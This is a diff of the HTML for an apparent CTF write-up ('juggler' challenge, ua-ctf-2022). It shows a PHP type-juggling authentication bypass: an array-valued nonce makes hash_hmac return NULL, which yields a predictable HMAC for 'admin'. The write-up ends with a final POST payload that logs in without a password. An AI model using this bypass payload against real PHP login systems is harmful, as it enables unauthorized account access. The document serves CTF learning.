@@ -482,23 +482,25 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># $secret = hash_hmac(&#39;sha256&#39;, $_POST[&#39;nonce&#39;], $secret);
 </span></span></span><span class="line"><span class="cl"><span class="c1"># $hmac = hash_hmac(&#39;sha256&#39;, $_POST[&#39;username&#39;], $secret); 
 </span></span></span><span class="line"><span class="cl"><span class="c1"># $_POST[&#39;hmac&#39;] === $hmac
-</span></span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">nonce</span><span class="p">[]</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><code>$hmac</code> should be <code>8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080</code></p>
+</div><p>And <code>$hmac</code> should be <code>8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo hash_hmac(&#39;sha256&#39;, &#34;admin&#34;, NULL);
-</span></span><span class="line"><span class="cl">// 8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="k">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Final payload</p>
 <div class="highlight"><div class="chroma">
@@ -506,7 +508,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=admin&amp;password[]=&amp;hmac=8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080&amp;nonce[]=
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">username=admin<span class="err">&amp;</span>password[]=<span class="err">&amp;</span>hmac=8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080<span class="err">&amp;</span>nonce[]=
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="/p/ua-ctf-2022/img/juggler_flag.png"
